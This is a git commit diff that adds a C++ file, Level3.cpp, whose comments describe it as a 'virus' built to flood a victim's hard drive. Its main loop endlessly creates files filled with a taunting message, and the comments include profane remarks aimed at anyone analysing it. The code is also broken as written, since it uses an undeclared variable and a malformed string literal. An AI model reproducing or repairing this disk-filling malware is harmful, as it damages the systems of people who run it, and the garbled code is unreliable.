17225568c1d0409b209e0825e7d8d33a79f3a0b1
Saya2020 <bobcatato@gmail.com>
2016-11-29 08:53:04 +0000

    Update Level3.cpp

--- Level3.cpp
+++ Level3.cpp
@@ -1,1 +1,29 @@
-#
+#include <iostream>
+#include <fstream>
+#include <cstdlib>
+#include <string>
+
+/*
+* A little message for anyone who decides to analyse the virus
+*
+* Level 3 - Karma's a real cunt (Especially when is comes to flooding your hard drive)
+*/
+
+char msg[] = "Luigi is comming for you...";
+
+/* 
+* Main script
+*/
+
+int main(int argc, const char *argv[]) {
+ 
+  while (true) {                                          // To infinity and beyond
+    ofstream newFile (('cool' + x.c_str()).c_str());      // New file
+
+    if (newFile.is_open()) {                              // If the file is open
+      newFile << "Looooooool - Time to empty your hardrive";   // Add a troll message
+    }
+  }
+  
+ return 0;
+}
